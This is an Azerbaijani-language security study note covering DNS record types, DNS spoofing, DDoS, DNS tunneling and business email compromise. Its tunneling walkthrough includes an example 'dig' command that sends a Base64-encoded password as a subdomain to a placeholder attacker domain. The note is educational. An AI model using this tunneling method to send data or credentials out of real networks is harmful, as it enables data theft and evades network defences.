# 🌐 5-cü Gün: DNS Protokolu və DNS Tunneling (Part 1)

DNS (Domain Name System) internetin "telefon kitabçasıdır". Kompüterlər IP ünvanları vasitəsilə (məs: `93.184.216.34`), biz isə adlar vasitəsilə (`google.com`) ünsiyyət qururuq. DNS bu iki dünya arasında tərcüməçilik edir.

## 📋 DNS Rekordları (Məlumat Növləri)
Təhlükəsizlik mütəxəssisləri və hakerlər bir hədəfi araşdırarkən bu rekordları analiz edirlər:

* **A Record:** Saytın IPv4 ünvanını göstərir (Nümunə: `example.com` -> `1.2.3.4`).
* **AAAA Record:** Saytın IPv6 ünvanını göstərir.
* **CNAME Record:** Bir adı digərinə bağlayır (Alias). `blog.sayt.com` -> `sayt.com`.
* **MX (Mail Exchange):** E-poçt serverlərini müəyyən edir. E-poçt sızmaları üçün bu rekord araşdırılır.
* **TXT Record:** İçində müxtəlif qeydlər (doğrulamalar) olur. Çox vaxt təhlükəsizlik sertifikatları bura yazılır.

---

## 🏴‍☠️ DNS Hücumları
1.  **DNS Spoofing (Cache Poisoning):** DNS-in yaddaşını "zəhərləyərək" istifadəçini saxta bir sayta (məsələn, saxta bank saytı) yönləndirmək.
2.  **DDoS:** DNS serverini sorğu yağışına tutaraq saytı əlçatmaz etmək.
3.  **DNS Tunneling:** Şəbəkə bloklarını keçmək üçün istifadə olunan ən təhlükəli sızma yollarından biridir.

---

## 🛠️ DNS Tunneling: Detallı İzah
Şəbəkədə hər şey bloklansa belə, DNS sorğuları adətən açıq olur. Hakerlər məlumatları bu sorğuların içinə gizlədərək şəbəkədən kənara sızdırırlar.

### Mexanizm:
Bu proses üçün hakerin iki ehtiyacı var:
1.  **Zərərli proqram (Malware):** Qurbanın kompüterində məlumatı paketləyən kod.
2.  **Authoritative DNS Server:** Hakerin nəzarətində olan və "tuneli" qəbul edən server.

### Addım-addım Proses:
1.  **Kodlaşdırma:** Oğurlanacaq məlumat (məs: `parol123`) Base64 formatına çevrilir: `cGFyb2wxMjM=`.
2.  **Sorğunun Göndərilməsi:** Bu kod bir alt-domen (subdomain) kimi DNS sorğusuna qoyulur:
    `dig cGFyb2wxMjM=.hakker-sayti.com`
3.  **Tranzit:** Şirkətin daxili DNS serveri bu ünvanı tanımır və sorğunu internetə — birbaşa hakerin serverinə yönləndirir.
4.  **Məlumatın Alınması:** Hakerin serveri sorğunu tutur, `cGFyb2wxMjM=` hissəsini dekod edir və `parol123` məlumatını əldə edir.

---

## ⚠️ BEC (Business Email Compromise) nədir?
**BEC**, kiber cinayətkarların şirkət rəhbəri, işçisi və ya tərəfdaşı kimi özlərini təqdim edərək, işçiləri saxta hesablara pul köçürməyə və ya məxfi məlumatları paylaşmağa inandırdığı mürəkkəb bir fırıldaqçılıq növüdür.

---
